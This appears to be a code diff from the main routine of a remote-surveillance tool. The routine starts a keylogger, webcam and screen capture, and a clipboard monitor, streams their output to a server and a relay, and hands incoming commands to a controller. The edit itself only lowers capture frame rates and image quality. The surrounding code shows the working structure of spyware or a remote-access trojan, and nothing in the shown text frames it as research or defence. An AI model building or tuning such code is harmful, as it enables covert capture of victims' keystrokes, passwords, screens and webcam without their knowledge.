@@ -67,14 +67,14 @@ def main():
         server.broadcast_clipboard(text)
         if relay: relay.broadcast_clipboard(text)
 
-    camera = cam.CameraCapture(on_frame=broadcast_camera, fps=10, quality=55)
+    camera = cam.CameraCapture(on_frame=broadcast_camera, fps=8, quality=40)
     server.init(controller.handle_command, recorder, camera)
     if relay:
         relay.init(controller.handle_command, recorder, camera)
         relay.run()
 
     kl.Keylogger(broadcast_key).start()
-    capture = sc.ScreenCapture(broadcast_frame, fps=12, quality=55, scale=0.6)
+    capture = sc.ScreenCapture(broadcast_frame, fps=8, quality=35, scale=0.5)
     capture.attach_recorder(recorder)
     capture.start()
     cb.ClipboardMonitor(broadcast_clipboard).start()
